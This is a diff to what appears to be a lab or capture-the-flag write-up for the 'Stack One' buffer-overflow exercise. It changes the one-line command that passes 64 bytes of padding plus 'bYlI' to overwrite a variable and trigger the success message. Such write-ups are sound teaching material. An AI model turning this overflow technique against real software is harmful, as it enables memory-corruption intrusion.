@@ -36,6 +36,6 @@ By suppyling an argument longer than 64 bytes, the buffer can be overflowed and 
 The `SECRET_PATTERN` that successfully solves Stack One is therefore `64 bytes of padding` + `bYlI`:
 
 ```c
-./stack_one "$(python3 -c 'import sys; sys.stdout.write("A"*64 + "bYlI")')
+./stack_one $(python -c 'print("A"*64 + "bYlI")')
 ```
 This overwrites the `changeme` with the correct value and triggers the success message.
